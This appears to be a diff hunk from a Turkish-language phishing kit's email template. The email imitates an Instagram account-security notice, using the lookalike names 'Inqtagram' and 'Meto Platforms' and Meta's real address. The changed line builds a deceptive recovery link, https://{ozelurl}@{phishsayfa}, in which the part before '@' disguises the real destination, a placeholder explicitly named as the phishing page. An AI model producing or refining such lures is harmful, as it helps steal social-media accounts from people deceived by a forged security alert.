@@ -89,7 +89,7 @@ Bu kişi sizseniz, birkaç gün boyunca belirli güvenlik ve hesap ayarlarına e
  
 Bu kişi siz değilseniz, Hesabınızı Kurtarmak İçin! 
 
-Hesabınızı Kurtarmak İçin: (https://{ozelurl}@{phishsayfa})
+Hesabınızı Kurtarmak İçin: https://{ozelurl}@{phishsayfa}
    
 
 © Inqtagram. Meto Platforms, Inc., 1701 Willow Road, Menlo Park, CA 94025
